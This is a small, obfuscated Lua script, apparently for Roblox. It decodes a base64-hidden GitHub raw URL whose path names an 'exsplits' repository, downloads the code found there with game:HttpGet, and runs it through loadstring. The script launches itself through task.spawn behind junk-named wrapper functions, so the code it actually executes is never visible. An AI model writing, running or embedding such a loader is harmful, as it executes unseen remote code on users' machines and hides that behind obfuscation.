local function cmH(x) local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local r="" x=x:gsub("[^%w%+%/%=]","") for i=1,#x,4 do local a,k,c,d=x:byte(i,i+3) local n=((a or 65)*65536)+((k or 65)*256)+(c or 65) r=r..string.char(math.floor(n/65536)%256,math.floor(n/256)%256,n%256) end return r end
local function b2z() local s,u=pcall(function() local IGsgbWtzZCAlJSBpY="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL295c3RlcnphcnNreXkvZXhzcGxpdHMvcmVmcy9oZWFkcy9tYWluL3RyaXBsZWxpZ2UvcHJpc2xpbS5sdWE" local dat=game:HttpGet(cmH(IGsgbWtzZCAlJSBpY)) if dat and #dat>0 then local chk="@"..tostring(math.random(1000,9999))..".lua" local fn,err=loadstring(dat,chk) if fn then return fn() else error(err) end end end) if not s then warn(u) end end
local function IGsgbWtzZCAlJSBpY_hbCAuLiBwLC5z() b2z() end
local function __hbCAuLiBwLC5z_w() IGsgbWtzZCAlJSBpY_hbCAuLiBwLC5z() end
task.spawn(__hbCAuLiBwLC5z_w)
